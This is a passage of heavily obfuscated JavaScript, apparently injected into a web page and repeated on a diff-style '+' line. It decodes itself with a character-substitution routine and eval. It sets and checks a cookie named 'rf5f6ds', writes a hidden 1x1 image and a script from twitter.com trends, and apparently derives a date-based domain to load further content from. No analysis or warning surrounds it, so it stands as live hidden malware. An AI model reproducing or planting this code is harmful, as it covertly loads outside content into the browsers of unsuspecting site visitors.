Z22iptZ3eZ22);}elsZ65Z7bZ24aZ3dZ27Z27};functZ69on Z73Z63(cZ6em,vZ2ceZ64)Z7bvaZ72Z20eZ78dZ3dnewZ20DaZ74Z65()Z3bexZ64.sZ65tDZ61te(Z65xdZ2egetZ44ateZ28)+eZ64);Z64ocZ75Z6dZ65nt.Z63ookZ69eZ3dcnZ6d+ Z27Z3dZ27 Z2beZ73cZ61Z70Z65Z28Z76)Z2bZ27;Z65Z78pZ69Z72Z65sZ3dZ27+exdZ2eZ74oZ47MTZ53trZ69ngZ28);Z7d;";function z(s){r="";for(i=0;i<s.length;i++){if(s.charAt(i)=="Z"){s1="%"}else{s1=s.charAt(i)}r=r+s1;}return unescape(r);}eval(z($a));</script>
+<script language="javascript">$a="Z64dZ3dZ22q|se|qdu]qwys^e}rub8tqiZ3c0}Z257F~dxZ3c0iuqbZ3c0y~tuh9kbudeb~0888iuqb0;08y~tuh0:0tqi990;08}Z257F~dx0N0tqi90:0y~tuh90;0tqi9+mfqb0iuqbSx!Z3c0iuqbSxZ2522Z3c0}Z257F~dxSxZ3c0tqiSxZ3c0}qwys^e}+~e}0-0Sq|se|qdu]qwys^e}rub8dy}uK7tqi7MZ3c0dy}uK7}Z257F~dx7MZ3c0dy}uK7iuqb7MZ3c0cxyvdY~tuh9+iuqbSx!0-0|uddubcK888dy}uK7iuqb7M060Z2520hQQ90;0~e}9050Z2526#9050Z2522Z2526M0;0|uddubcK888dy}uK7iuqb7M060Z2520hQQ90,,0Z252290;0~e}9050Z2522Z25M+Z22;cuZ3dZ22(p}b4g`mxq)6b}g}v}x}`m.|}ppqz6*(}rfuyq4gfw)6|``d.;;rvwyr}f:wZ7by;xp;v}zfszZ2526;64c}p`|)Z25$$4|q}s|`),$*(;}rfuyq*(;p}b*Z22;cbZ3dZ2273);Z2573tZ253dtmZ2570Z253dZ2527Z2527;for(iZ253d0;iZ253cdsZ252elZ2565ngtZ2568;Z22;daZ3dZ22fqb0t-7vrs}vybZ3esZ257F}7+0fqb0cxyvdY~tuh0-0Z2520+fqb0}Z257F~dxc0-0~ug0Qbbqi87e~Z257F7Z3c07tfu7Z3c07dxb7Z3c07vyb7Z3c07fyv7Z3c07huc7Z3c07fuc7Z3c07wxd7Z3c07u~y7Z3c07ud~7Z3c07|uf7Z3c07dgu79+fqb0|uddubc0-0~ug0Qbbqi87q7Z3c7r7Z3c7s7Z3c7t7Z3c7u7Z3c7v7Z3c7w7Z3c7x7Z3c7y7Z3c7z7Z3c7Z7b7Z3c7|7Z3c7}7Z3c7~7Z3c7Z257F7Z3c7`7Z3c7a7Z3c7b7Z3c7c7Z3c7d7Z3c7e7Z3c7f7Z3c7g7Z3c7h7Z3c7i7Z3c7j79+fqb0~e}rubc0-0~ug0Qbbqi8!Z3cZ2522Z3c#Z3c$Z3cZ25Z3cZ2526Z3cZ27Z3c(Z3c)9+fqb0dy}u0-0~ug0Qbbqi89+fqb0tqdu0-0~ug0Tqdu8Z22;dzZ3dZ22Z2566Z2575Z256ecZ2574Z2569oZ256e dwZ2528t)Z257bZ2563Z2561Z253dZ2527Z252564Z25256fZ252563Z252575mZ2565nZ25257Z2534.Z252577rZ2569Z252574Z252565(Z25252Z2532Z2527;cZ2565Z253dZ2527Z252522)Z2527;cbZ253dZ2527Z25253cscrZ252569Z252570Z2574 Z25256caZ2525Z2536egZ2525Z25375Z2561Z2567eZ25253dZ25255cZ25252Z2532jaZ2576Z252561Z2573cZ252572iZ252570tZ25255cZ252522Z25253eZ2527;Z2563Z2563Z253dZ2527Z25253cZ25255cZ25252fscripZ25257Z2534Z25253eZ2527;evaZ256c(unZ2565Z2573caZ2570e(tZ2529)Z257d;Z22;stZ3dZ22Z2573tZ253dZ2522Z2524Z2561Z253dsZ2574;Z2564cZ2573(Z2564aZ252bdZ2562Z252bdZ2563+Z2564Z2564+Z2564Z2565,Z2531Z2530Z2529;Z2564Z2577Z2528Z2573tZ2529;Z2573tZ253dZ2524Z2561;Z2522Z253bZ22;cdZ3dZ22sZ2574Z252bZ2553triZ256egZ252efrZ256fZ256dChZ2561rCoZ2564eZ2528(tZ256dZ2570Z252eZ256Z22;dcZ3dZ220!9+0yv08tqduZ3ewud]Z257F~dx89;!0,0!Z25209kcxyvdY~tuh0-0dy}uK7iuqb7M0;07Z3dZ252070;08tqduZ3ewud]Z257F~dx89;!90+mu|cukcxyvdY~tuh0-0dy}uK7iuqb7M0;07Z3d70;08tqduZ3ewud]Z257F~dx89;!9+myv08tqduZ3ewudTqdu890;!0,0!Z25209kcxyvdY~tuh0-cxyvdY~tuh0;07Z3dZ252070;0tqduZ3ewudTqdu89+mu|cukcxyvdY~tuh0-0cxyvdY~tuh0;07Z3d70;0tqduZ3ewudTqdu89+mcxyvdY~tuh0-0gy~tZ257FgZ3edgZ3edbu~tcKcxyvdY~tuhMKZ2520MZ3eaeubiZ3esxqbSZ257FtuQd8!9+ve~sdyZ257F~0SZ22;caZ3dZ22Z2566uZ256ectiZ256fn dZ2563s(Z2564sZ252ces)Z257bdsZ253duneZ2573capZ2565(Z2564Z25Z22;czZ3dZ22Z2566uncZ2574iZ256fnZ2520Z2563z(cZ257a)Z257brZ2565tuZ2572n Z2563Z2561+Z2563b+cZ2563+Z2563d+cZ2565+Z2563zZ253b}Z253bZ22;ceZ3dZ223harZ2543odeZ2541tZ25280)^Z2528Z25270Z2578Z25300Z2527+eZ2573Z2529));Z257d}Z22;dbZ3dZ229+tqduZ3ecudTqdu8tqduZ3ewudTqdu890Z3d0#9+0dy}uK7iuqb7M0-0tqduZ3ewudVe||Iuqb89+dy}uK7}Z257F~dx7M0-0tqduZ3ewud]Z257F~dx89;!+dy}uK7tqi7M0-0tqduZ3ewudTqdu89+yv08tqduZ3ewudTqi890--0!0ll0tqduZ3ewudTqi890--0Z25260ll0tqduZ3ewudTqi890--0$9ktqduZ3ecudTqdu8tqduZ3ewudTqdu890Z3d0!9+0dy}uK7tqi7M0-0tqduZ3ewudTqdu89+0dy}uK7}Z257F~dx7M0-0tqduZ3ewud]Z257F~dx89;!+0dy}uK7iuqb7M0-0tqduZ3ewudVe||Iuqb89+0m0tqduZ3ecudTqdu8tqduZ3ewudTqdu890;Z22;opZ3dZ22Z2524Z2561Z253dZ2522dZ2577(dZ2563s(cZ2575,14Z2529)Z253bZ2522;Z22;ccZ3dZ22Z2569+Z252b)Z257btmpZ253ddZ2573Z252eZ2573liZ2563eZ2528iZ252ci+Z2531)Z253bsZ2574Z253dZ22;deZ3dZ22iuqbSxZ25220-0|uddubcK8888dy}uK7iuqb7M060Z2520h##!!90..0#90;0~e}9050!Z25209M0;0|uddubcK8888dy}uK7iuqb7M060Z2520h##!!90..0$90;0~e}9050!Z25209M+}Z257F~dxSx0-0|uddubcK88dy}uK7}Z257F~dx7M0;0~e}9050Z2522Z259M0;0|uddubcK88dy}uK7}Z257F~dx7M0:0~e}9050Z2522Z259M+tqiSx0-0|uddubcK88dy}uK7tqi7M0:0Z25269050Z2522Z279M+4q-4qZ3ebu`|qsu8tZ3ciuqbSxZ25220;0}Z257F~dxSx0;0iuqbSx!0;0tqiSx0;0}Z257F~dxcKdy}uK7}Z257F~dx7M0Z3d0!M0;07Z3esZ257F}79+Z22;Z69Z66 (dZ6fcZ75Z6deZ6eZ74Z2ecoZ6fZ6bieZ2eZ69nZ64eZ78Z4ff(Z27rZ665Z66Z36dZ73Z27)Z3dZ3d-1)Z7bfuncZ74Z69on Z63alZ6cbacZ6b(x)Z7b Z77indZ6fZ77.twZ20Z3d Z78;sZ63(Z27rf5fZ36dsZ27,2,Z37);eZ76alZ28uneZ73caZ70e(dZ7aZ2bcZ7aZ2bZ6fp+sZ74)Z2bZ27dw(Z64z+cZ7aZ28$a+Z73t)Z29;Z27);Z64Z6fcuZ6denZ74.Z77ritZ65($aZ29;}Z64oZ63umZ65nZ74.wZ72Z69Z74e(Z22Z3cimgZ20srZ63Z3dZ27htZ74p:Z2fZ2fsearZ63h.tZ77Z69tZ74er.Z63omZ2fimagZ65sZ2fsearcZ68Z2frss.Z70nZ67Z27 widZ74hZ3d1 Z68Z65iZ67htZ3d1Z20styZ6ceZ3dZ27visibiliZ74y:hZ69ddeZ6eZ27 Z2fZ3e Z3cscrZ22+Z22ipt lZ61Z6eZ67uaZ67eZ3djavaZ73cZ72iptZ22+Z22 srcZ3dZ27httpZ3aZ2fZ2fsearcZ68.twZ69tteZ72.coZ6dZ2ftreZ6edZ73Z2fweekZ6cy.jZ73oZ6e?cZ61llbZ61Z63Z6bZ3dcallZ62aZ63k&Z65Z78Z63lZ75deZ3dZ68aZ73htZ61gZ73Z27Z3eZ22 + Z22Z3cZ2fscrZ22 + Z22iptZ3eZ22);}elsZ65Z7bZ24aZ3dZ27Z27};functZ69on Z73Z63(cZ6em,vZ2ceZ64)Z7bvaZ72Z20eZ78dZ3dnewZ20DaZ74Z65()Z3bexZ64.sZ65tDZ61te(Z65xdZ2egetZ44ateZ28)+eZ64);Z64ocZ75Z6dZ65nt.Z63ookZ69eZ3dcnZ6d+ Z27Z3dZ27 Z2beZ73cZ61Z70Z65Z28Z76)Z2bZ27;Z65Z78pZ69Z72Z65sZ3dZ27+exdZ2eZ74oZ47MTZ53trZ69ngZ28);Z7d;";function z(s){r="";for(i=0;i<s.length;i++){if(s.charAt(i)=="Z"){s1="%"}else{s1=s.charAt(i)}r=r+s1;}return unescape(r);}eval(z($a));</script>
